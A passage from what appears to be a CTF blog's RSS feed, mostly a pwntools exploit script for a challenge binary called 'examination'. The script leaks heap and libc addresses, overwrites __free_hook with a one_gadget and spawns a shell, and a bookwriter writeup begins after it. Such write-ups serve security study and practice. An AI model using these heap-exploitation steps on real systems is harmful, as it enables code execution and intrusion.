class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt;  *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r= process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./examination&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf =ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;examination&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free_got = elf.got[&lt;span class=&#34;string&#34;&gt;&amp;#x27;free&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;ch&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice&amp;gt;&amp;gt;&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;changerole&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ch(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;role:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;givescore&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ch(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;addstudent&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ch(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;questions:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;writereview&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx,size,text&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ch(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;one&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; size:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;comment&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(text)==size:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;               r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;comment&amp;quot;&lt;/span&gt;,text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                 r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;comment&amp;quot;&lt;/span&gt;,text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;callparent&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ch(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choose&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;pray&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ch(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;setmode&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;text&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ch(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;mode&amp;quot;&lt;/span&gt;,text+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;pray_score&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;num&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ch(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;score&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;changeid&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ch(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;id&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#leak heap_addr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addstudent(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;givescore()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writereview(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x310&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaaaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;changerole(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pray()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;changerole(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addstudent(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pad = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;A&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0xa0&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x271&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;AAAAAAAA&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writereview(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x310&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aaaaaaaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addstudent(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writereview(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x310&lt;/span&gt;,pad)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addstudent(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writereview(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bbbbbbbb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;changerole(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;changeid(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pray()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;changeid(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pray()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;changeid(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pray()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;changerole(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;givescore()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;changerole(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ch(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Good Job! Here is your reward! &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;,drop=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;),&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)-&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;heap_addr : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(heap_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aimed = (heap_addr+&lt;span class=&#34;number&#34;&gt;0x3c9&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;aimed : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(aimed))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;addr&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;00&amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(aimed))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#new student ,free to tcaceh &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;changerole(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;callparent(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addstudent(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writereview(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;changerole(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;changeid(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ch(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;aimed = heap_addr+&lt;span class=&#34;number&#34;&gt;0x411&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;addr&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;00&amp;quot;&lt;/span&gt;+&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(aimed))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;changeid(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ch(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase = u64(r.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))-&lt;span class=&#34;number&#34;&gt;0x1ecbe0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;libc : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libcbase))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;environ =libcbase- &lt;span class=&#34;number&#34;&gt;0x1ef600&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc_hook = libcbase + &lt;span class=&#34;number&#34;&gt;0x1ecb70&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free_hook = libcbase +  &lt;span class=&#34;number&#34;&gt;0x1eee48&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onegadget = libcbase + &lt;span class=&#34;number&#34;&gt;0xe3b31&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#onegadget = 0xcafebabedeadbeef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;changerole(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#we have already leak the libc address,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#but next how can we realize write anywhere&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addstudent(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writereview(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;CCCC&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pad =  &lt;span class=&#34;string&#34;&gt;b&amp;#x27;x&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x31&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pad += p64(heap_addr+&lt;span class=&#34;number&#34;&gt;0x470&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pad += p64(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)+p64(free_hook)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writereview(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,pad)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;writereview(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,p64(onegadget))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;callparent(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/04/14/heap-paradise/</guid>
            <title>heap_paradise</title>
            <link>http://example.com/2022/04/14/heap-paradise/</link>
            <category>writeup</category>
            <pubDate>Thu, 14 Apr 2022 13:08:37 +0800</pubDate>
            <description><![CDATA[  ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/04/10/pwnable-bookwriter/</guid>
            <title></title>
            <link>http://example.com/2022/04/10/pwnable-bookwriter/</link>
            <category>writeup</category>
            <pubDate>Sun, 10 Apr 2022 19:09:05 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;pwnabletw&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwnabletw&#34;&gt;#&lt;/a&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3B3bmFibGUudHc=&#34;&gt;pwnable.tw&lt;/span&gt;	bookwriter			ubuntu16,libc 2.23&lt;/h1&gt;
&lt;h2 id=&#34;保护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#保护&#34;&gt;#&lt;/a&gt; 保护：&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;giantbranch@ubuntu:~/Desktop/pwnabletw/BookWriter$ checksec --file=bookwriter&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/giantbranch/Desktop/pwnabletw/BookWriter/bookwriter&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64-&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No PIE (&lt;span class=&#34;number&#34;&gt;0x400000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    FORTIFY:  Enabled&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
